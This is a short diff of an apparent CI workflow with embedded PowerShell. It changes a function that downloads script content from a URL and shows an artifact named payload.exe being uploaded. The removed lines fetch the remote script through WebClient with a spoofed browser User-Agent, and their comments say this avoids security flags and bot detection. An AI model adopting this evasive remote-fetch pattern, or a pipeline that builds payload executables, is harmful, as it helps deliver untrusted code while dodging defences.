@@ -30,10 +30,7 @@ jobs:
         function FetchScriptContent {
             param ([string]$scriptUrl)
             try {
-                # Using System.Net.WebClient to avoid Invoke-WebRequest security flags
-                $webClient = New-Object System.Net.WebClient
-                $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)") # Avoid bot detection
-                return $webClient.DownloadString($scriptUrl)
+                return Invoke-RestMethod -Uri $scriptUrl -TimeoutSec 10
             } catch {
                 Write-Host "Error: Failed to fetch data from URL - $scriptUrl"
                 return $null
@@ -81,5 +78,6 @@ jobs:
       with:
         name: payload_exe
         path: payload.exe
+
 
 
